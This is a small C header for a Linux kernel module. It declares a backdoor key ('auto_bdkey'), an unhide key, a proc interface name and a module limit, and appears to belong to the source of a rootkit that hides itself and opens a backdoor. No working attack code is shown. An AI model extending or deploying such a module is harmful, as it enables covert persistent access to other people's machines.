#ifndef VAR_H
#define VAR_H

#include <linux/module.h>
#include <linux/types.h>
#include <linux/mutex.h>

#ifndef PROCNAME
#error "PROCNAME not defined. Use -DPROCNAME=<proc_interface_name>"
#endif

#define MAX_MODULES 16
#define KEY_SIZE    32

extern char auto_bdkey[KEY_SIZE + 1];
extern char auto_unhidekey[KEY_SIZE + 1];

extern const char procname[];

extern int ave_debug_level;
extern struct mutex ave_lock;

#endif /* VAR_H */
